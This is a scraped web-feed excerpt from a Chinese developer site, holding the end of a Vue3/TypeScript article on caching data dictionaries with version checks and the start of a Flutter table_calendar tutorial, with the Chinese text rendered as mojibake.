  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDicts</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
    dict.<span class="hljs-property">value</span> = <span class="hljs-keyword">await</span> dictStore.<span class="hljs-title function_">getDicts</span>(params)
  }

  <span class="hljs-comment">// åˆå§‹åŒ–å­—å…¸æ•°æ®</span>
  <span class="hljs-title function_">getDicts</span>()

  <span class="hljs-comment">// æ ¹æ®å­—å…¸åç§°è·å–å­—å…¸æ•°æ®</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDict</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDict</span>(name)
  }

  <span class="hljs-comment">// æ ¹æ®å­—å…¸å€¼è·å–å­—å…¸label</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">getDictLabel</span> = (<span class="hljs-params">name: <span class="hljs-built_in">string</span>, value: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-keyword">return</span> dictStore.<span class="hljs-title function_">getDictLabel</span>(name, value)
  }

  <span class="hljs-keyword">return</span> {
    dict,
    getDict,
    getDictLabel
  }
}
</code></pre>
<h3 data-id="heading-22">å“åº”æ‹¦æˆª</h3>
<p>ä¸»è¦ç”¨äºè·å–å­—å…¸çš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œé€šè¿‡å¯¹æ¯”ç‰ˆæœ¬ä¿¡æ¯ï¼Œä»è€Œç¡®å®šæ˜¯å¦æ¸…é™¤æœ¬åœ°çš„å­—å…¸ç¼“å­˜æ•°æ®ï¼Œå¹¶æ›´æ–°æœ¬åœ°ç¼“å­˜çš„ç‰ˆæœ¬ä¿¡æ¯</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å“åº”æ‹¦æˆªå™¨</span>
service.<span class="hljs-property">interceptors</span>.<span class="hljs-property">response</span>.<span class="hljs-title function_">use</span>(
  <span class="hljs-comment">// AxiosResponse</span>
  <span class="hljs-function">(<span class="hljs-params">response: AxiosResponse</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> dictVersion = response.<span class="hljs-property">headers</span>[<span class="hljs-string">'x-dictionary-version'</span>]
    <span class="hljs-keyword">if</span> (dictVersion) {
      <span class="hljs-keyword">const</span> dictStore = <span class="hljs-title function_">useDictStore</span>()
      <span class="hljs-comment">// å¯¹æ¯”ç‰ˆæœ¬æ˜¯å¦æœ‰æ›´æ–°</span>
      <span class="hljs-keyword">if</span> (dictStore.<span class="hljs-title function_">getDictVersion</span>() !== dictVersion) {
        dictStore.<span class="hljs-title function_">clearAllDict</span>()
        dictStore.<span class="hljs-title function_">updateDictVersion</span>(dictVersion || <span class="hljs-string">''</span>)
      }
    }
    <span class="hljs-comment">// ...é¡¹ç›®ä¸­çš„ä¸šåŠ¡é€»è¾‘</span>
  }
)
</code></pre>
<h3 data-id="heading-23">é¡¹ç›®ä¸­çš„å…·ä½“ä½¿ç”¨</h3>
<p>ä¸‹è¿°çš„æ€ä¹ˆä½¿ç”¨å°è£…çš„å­—å…¸ç®¡ç†çš„ç®€å•demo</p>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { useDict } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/hooks/useDict'</span>
<span class="hljs-comment">// è·å–dict</span>
<span class="hljs-keyword">const</span> { dict, getDictLabel } =  <span class="hljs-title function_">useDict</span>([<span class="hljs-string">'status'</span>, <span class="hljs-string">'sex'</span>])
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dict.<span class="hljs-property">status</span>, dict.<span class="hljs-property">sex</span>)
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-24">é¡¹ç›®æºç åœ°å€</h3>
<p>neståç«¯</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FYangGong-Zi%2FUnusual-Server" target="_blank" title="https://github.com/YangGong-Zi/Unusual-Server" ref="nofollow noopener noreferrer">Unusual-Server (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2FYancy_Hill%2Funusual-server" target="_blank" title="https://gitee.com/Yancy_Hill/unusual-server" ref="nofollow noopener noreferrer">Unusual-Server (gitee)</a></p>
<p>vue3å‰ç«¯</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwzwdream%2FUnusual-Admin" target="_blank" title="https://github.com/wzwdream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (github)</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fwang-zewei-dream%2FUnusual-Admin" target="_blank" title="https://gitee.com/wang-zewei-dream/Unusual-Admin" ref="nofollow noopener noreferrer">Unusual-Admin (gitee)</a></p>
<h2 data-id="heading-25">ç»“è¯­</h2>
<p>æœ¬æ–‡ä»‹ç»äº†å››ç§ä¸»æµçš„æ•°æ®å­—å…¸å®ç°æ–¹æ¡ˆï¼Œä»å…¨é‡åŠ è½½åˆ°æŒ‰éœ€åŠ è½½ï¼Œä»æ— ç¼“å­˜åˆ°ç‰ˆæœ¬æ ¡éªŒç¼“å­˜ï¼Œæ¯ç§æ–¹æ¡ˆéƒ½å±•ç°äº†å…¶ç‹¬ç‰¹çš„ä¼˜åŠ¿ä¸ç¼ºç‚¹ã€‚é€šè¿‡å¯¹æ¯”åˆ†æï¼Œæˆ‘ä»¬ä¸éš¾å‘ç°ï¼Œæ²¡æœ‰ä¸€ç§æ–¹æ¡ˆèƒ½å¤Ÿé€‚ç”¨äºæ‰€æœ‰åœºæ™¯ï¼Œè€Œæ˜¯éœ€è¦æ ¹æ®é¡¹ç›®çš„å…·ä½“ç‰¹æ€§è¿›è¡Œçµæ´»é€‰æ‹©ã€‚å¯¹äºå­—å…¸ç¨³å®šä¸”é‡å°çš„é¡¹ç›®ï¼Œå…¨é‡ç¼“å­˜æ–¹æ¡ˆèƒ½å¤Ÿå¸¦æ¥æè‡´çš„å“åº”é€Ÿåº¦ï¼›å¯¹äºå­—å…¸é¢‘ç¹æ›´æ–°çš„åœºæ™¯ï¼Œç‰ˆæœ¬æ ¡éªŒç¼“å­˜æ–¹æ¡ˆåˆ™èƒ½åœ¨ä¿éšœæ•°æ®å®æ—¶æ€§çš„åŒæ—¶ï¼Œå®ç°å­˜å‚¨ç©ºé—´ä¸ç½‘ç»œè¯·æ±‚çš„å¹³è¡¡ä¼˜åŒ–ã€‚æœªæ¥ï¼Œéšç€æŠ€æœ¯çš„ä¸æ–­è¿›æ­¥ä¸åº”ç”¨åœºæ™¯çš„ä¸æ–­æ‹“å±•ï¼Œæ•°æ®å­—å…¸çš„å®ç°æ–¹æ¡ˆä¹Ÿå°†æŒç»­æ¼”è¿›ã€‚</p>
<blockquote>
<p>åšå®¢ä¸»è¦è®°å½•ä¸€äº›å­¦ä¹ çš„æ–‡ç« ï¼Œå¦‚æœ‰ä¸è¶³ï¼Œæœ›å¤§å®¶æŒ‡å‡ºï¼Œè°¢è°¢ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutterè‡ªå®šä¹‰æ—¥å†table_calendarå®Œå…¨æŒ‡å—+æ¡ˆä¾‹]]></title>    <link>https://juejin.cn/post/7581693431740448831</link>    <guid>https://juejin.cn/post/7581693431740448831</guid>    <pubDate>2025-12-10T00:45:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431740448831" data-draft-id="7581097545671376915" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Flutterè‡ªå®šä¹‰æ—¥å†table_calendarå®Œå…¨æŒ‡å—+æ¡ˆä¾‹"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter,Android"/> <meta itemprop="datePublished" content="2025-12-10T00:45:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¹å¤šå¤š"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Flutterè‡ªå®šä¹‰æ—¥å†table_calendarå®Œå…¨æŒ‡å—+æ¡ˆä¾‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¹å¤šå¤š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:45:26.000Z" title="Wed Dec 10 2025 00:45:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">1. ç®€ä»‹</h2>
<p><code>table_calendar</code> æ˜¯ Flutter ç”Ÿæ€ä¸­åŠŸèƒ½å¼ºå¤§çš„æ—¥å†ç»„ä»¶ï¼Œæ”¯æŒå¤šç§è§†å›¾åˆ‡æ¢ã€äº‹ä»¶æ ‡è®°ã€æ—¥æœŸèŒƒå›´é€‰æ‹©ç­‰æ ¸å¿ƒåŠŸèƒ½ï¼Œé€‚åˆéœ€é›†æˆæ—¥å†åŠŸèƒ½çš„åº”ç”¨åœºæ™¯ï¼ˆå¦‚æ—¥ç¨‹ç®¡ç†ã€é¢„çº¦ç³»ç»Ÿç­‰ï¼‰ã€‚å…¶é«˜åº¦å¯å®šåˆ¶åŒ–çš„ç‰¹æ€§ä½¿å…¶èƒ½é€‚é…ä¸åŒçš„ UI éœ€æ±‚ã€‚</p>
<h2 data-id="heading-1">2. åŸºç¡€é…ç½®</h2>
<h3 data-id="heading-2">å®‰è£…</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">table_calendar:</span> <span class="hljs-string">^3.0.1</span>  <span class="hljs-comment"># è¯·ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬</span>
</code></pre>
<h3 data-id="heading-3">æœ€ç®€å®ç°</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:table_calendar/table_calendar.dart'</span>;

TableCalendar(
  firstDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2020</span>),
  lastDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2030</span>),
  focusedDay: <span class="hljs-built_in">DateTime</span>.now(),
  selectedDayPredicate: (day) {
    <span class="hljs-keyword">return</span> isSameDay(_selectedDay, day);
  },
  onDaySelected: (selectedDay, focusedDay) {
    setState(() {
      _selectedDay = selectedDay;
      _focusedDay = focusedDay;
    });
  },
)
</code></pre>
<p>æ ¸å¿ƒå‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>firstDay</code>/<code>lastDay</code>ï¼šæ—¥å†æ˜¾ç¤ºèŒƒå›´ï¼ˆå¿…ä¼ ï¼‰</li>
<li><code>focusedDay</code>ï¼šå½“å‰èšç„¦çš„æ—¥æœŸï¼ˆæ§åˆ¶æ»šåŠ¨ä½ç½®ï¼Œå¿…ä¼ ï¼‰</li>
<li><code>selectedDayPredicate</code>ï¼šåˆ¤æ–­æ—¥æœŸæ˜¯å¦è¢«é€‰ä¸­çš„æ¡ä»¶</li>
<li><code>onDaySelected</code>ï¼šæ—¥æœŸé€‰æ‹©å›è°ƒï¼ˆè¿”å›é€‰ä¸­æ—¥æœŸå’Œæ–°èšç„¦æ—¥æœŸï¼‰</li>
</ul>
<h2 data-id="heading-4">3. æ ¸å¿ƒå±æ€§å…¨è§£æ</h2>
<h3 data-id="heading-5">3.1. æ ¸å¿ƒåŸºç¡€å±æ€§</h3>








































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>firstDay</code></td><td><code>DateTime</code></td><td>æ—¥å†æ˜¾ç¤ºçš„èµ·å§‹æ—¥æœŸï¼ˆå¿…ä¼ ï¼‰</td></tr><tr><td><code>lastDay</code></td><td><code>DateTime</code></td><td>æ—¥å†æ˜¾ç¤ºçš„ç»“æŸæ—¥æœŸï¼ˆå¿…ä¼ ï¼‰</td></tr><tr><td><code>focusedDay</code></td><td><code>DateTime</code></td><td>å½“å‰èšç„¦çš„æ—¥æœŸï¼ˆå¿…ä¼ ï¼Œæ§åˆ¶æ—¥å†æ»šåŠ¨ä½ç½®ï¼‰</td></tr><tr><td><code>selectedDayPredicate</code></td><td><code>bool Function(DateTime)</code></td><td>åˆ¤æ–­æ—¥æœŸæ˜¯å¦è¢«é€‰ä¸­çš„æ¡ä»¶</td></tr><tr><td><code>onDaySelected</code></td><td><code>void Function(DateTime, DateTime)</code></td><td>å•ä¸ªæ—¥æœŸé€‰ä¸­å›è°ƒï¼ˆé€‰ä¸­æ—¥æœŸ+èšç„¦æ—¥æœŸï¼‰</td></tr><tr><td><code>onPageChanged</code></td><td><code>void Function(DateTime)</code></td><td>æ—¥å†é¡µé¢åˆ‡æ¢æ—¶å›è°ƒï¼ˆè¿”å›æ–°èšç„¦æ—¥æœŸï¼‰</td></tr></tbody></table>
<h3 data-id="heading-6">3.2. è§†å›¾æ§åˆ¶å±æ€§</h3>








































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>calendarFormat</code></td><td><code>CalendarFormat</code></td><td>æ—¥å†å±•ç¤ºæ ¼å¼ï¼ˆmonth/week/twoWeeksï¼‰</td></tr><tr><td><code>onFormatChanged</code></td><td><code>void Function(CalendarFormat)</code></td><td>è§†å›¾æ ¼å¼åˆ‡æ¢å›è°ƒ</td></tr><tr><td><code>availableCalendarFormats</code></td><td><code>Map&lt;CalendarFormat, String&gt;</code></td><td>å…è®¸çš„è§†å›¾æ ¼å¼åŠå¯¹åº”æ˜¾ç¤ºæ–‡æœ¬</td></tr><tr><td><code>pageJumpingEnabled</code></td><td><code>bool</code></td><td>æ˜¯å¦å…è®¸ç‚¹å‡»è¡¨å¤´æœˆä»½å¿«é€Ÿè·³è½¬é¡µé¢ï¼ˆé»˜è®¤trueï¼‰</td></tr><tr><td><code>weekNumbersVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºå‘¨æ•°ï¼ˆé»˜è®¤falseï¼‰</td></tr><tr><td><code>weekNumberStyle</code></td><td><code>TextStyle</code></td><td>å‘¨æ•°æ–‡æœ¬æ ·å¼</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">TableCalendar(
  <span class="hljs-comment">// ...åŸºç¡€å‚æ•°</span>
  calendarFormat: _calendarFormat,
  onFormatChanged: (format) {
    setState(() {
      _calendarFormat = format;
    });
  },
  availableCalendarFormats: {
    CalendarFormat.month: <span class="hljs-string">'æœˆ'</span>,
    CalendarFormat.week: <span class="hljs-string">'å‘¨'</span>,
    CalendarFormat.twoWeeks: <span class="hljs-string">'ä¸¤å‘¨'</span>,
  },
)
</code></pre>
<h3 data-id="heading-7">3.3. èŒƒå›´é€‰æ‹©å±æ€§</h3>



































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>rangeStartDay</code></td><td><code>DateTime?</code></td><td>èŒƒå›´é€‰æ‹©çš„èµ·å§‹æ—¥æœŸ</td></tr><tr><td><code>rangeEndDay</code></td><td><code>DateTime?</code></td><td>èŒƒå›´é€‰æ‹©çš„ç»“æŸæ—¥æœŸ</td></tr><tr><td><code>rangeSelectionMode</code></td><td><code>RangeSelectionMode</code></td><td>èŒƒå›´é€‰æ‹©æ¨¡å¼ï¼ˆtoggledOff/toggledOn/forcedï¼‰</td></tr><tr><td><code>onRangeSelected</code></td><td><code>void Function(DateTime?, DateTime?, DateTime)</code></td><td>èŒƒå›´é€‰æ‹©å›è°ƒï¼ˆèµ·å§‹/ç»“æŸ/èšç„¦æ—¥æœŸï¼‰</td></tr><tr><td><code>rangeDayPredicate</code></td><td><code>bool Function(DateTime)</code></td><td>åˆ¤æ–­æ—¥æœŸæ˜¯å¦å…è®¸è¢«çº³å…¥èŒƒå›´é€‰æ‹©</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">RangeSelectionMode _rangeSelectionMode = RangeSelectionMode.toggledOff;
<span class="hljs-built_in">DateTime?</span> _rangeStart;
<span class="hljs-built_in">DateTime?</span> _rangeEnd;

TableCalendar(
  <span class="hljs-comment">// ...åŸºç¡€å‚æ•°</span>
  rangeStartDay: _rangeStart,
  rangeEndDay: _rangeEnd,
  rangeSelectionMode: _rangeSelectionMode,
  onRangeSelected: (start, end, focusedDay) {
    setState(() {
      _rangeStart = start;
      _rangeEnd = end;
      _rangeSelectionMode = RangeSelectionMode.toggledOn;
      _selectedDay = <span class="hljs-keyword">null</span>;  <span class="hljs-comment">// æ¸…é™¤å•ä¸ªé€‰ä¸­</span>
    });
  },
)
</code></pre>
<h3 data-id="heading-8">3.4. äº‹ä»¶ä¸æ ‡è®°å±æ€§</h3>





























